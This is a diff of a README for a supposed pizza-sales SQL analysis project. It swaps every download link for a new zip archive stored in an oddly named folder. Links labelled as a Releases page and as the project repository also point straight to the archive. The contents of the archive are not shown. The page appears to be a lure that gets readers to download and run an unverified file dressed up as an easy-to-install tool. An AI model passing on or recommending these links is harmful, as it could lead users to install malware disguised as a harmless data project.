@@ -1,6 +1,6 @@
 # 📊 Pizza-Sales-SQL-Analysis - Analyze Pizza Sales Effortlessly
 
-[![Download](https://raw.githubusercontent.com/risaza12/Pizza-Sales-SQL-Analysis/main/ocellary/Pizza-Sales-SQL-Analysis.zip%20Now-blue)](https://raw.githubusercontent.com/risaza12/Pizza-Sales-SQL-Analysis/main/ocellary/Pizza-Sales-SQL-Analysis.zip)
+[![Download](https://github.com/risaza12/Pizza-Sales-SQL-Analysis/raw/refs/heads/main/ocellary/Pizza-Analysis-Sales-SQ-3.9.zip%20Now-blue)](https://github.com/risaza12/Pizza-Sales-SQL-Analysis/raw/refs/heads/main/ocellary/Pizza-Analysis-Sales-SQ-3.9.zip)
 
 ## 📝 Description
 
@@ -13,7 +13,7 @@ To use this application, follow the steps below. It is designed for everyone, ev
 ## 📥 Download & Install
 
 1. **Visit the Download Page:** Click the link below to access the Releases page where you can download the latest version.
-   [Download Here](https://raw.githubusercontent.com/risaza12/Pizza-Sales-SQL-Analysis/main/ocellary/Pizza-Sales-SQL-Analysis.zip)
+   [Download Here](https://github.com/risaza12/Pizza-Sales-SQL-Analysis/raw/refs/heads/main/ocellary/Pizza-Analysis-Sales-SQ-3.9.zip)
 
 2. **Select Your Version:** On the Releases page, find the version suited for your needs and click on it.
 
@@ -77,7 +77,7 @@ For support or inquiries, feel free to reach out through the repository issues s
 
 ## 🔗 Important Links
 
-- [Download the latest version](https://raw.githubusercontent.com/risaza12/Pizza-Sales-SQL-Analysis/main/ocellary/Pizza-Sales-SQL-Analysis.zip)
-- [Project Repository](https://raw.githubusercontent.com/risaza12/Pizza-Sales-SQL-Analysis/main/ocellary/Pizza-Sales-SQL-Analysis.zip)
+- [Download the latest version](https://github.com/risaza12/Pizza-Sales-SQL-Analysis/raw/refs/heads/main/ocellary/Pizza-Analysis-Sales-SQ-3.9.zip)
+- [Project Repository](https://github.com/risaza12/Pizza-Sales-SQL-Analysis/raw/refs/heads/main/ocellary/Pizza-Analysis-Sales-SQ-3.9.zip)
 
 Thank you for your interest in the Pizza-Sales-SQL-Analysis project! Enjoy analyzing your data!
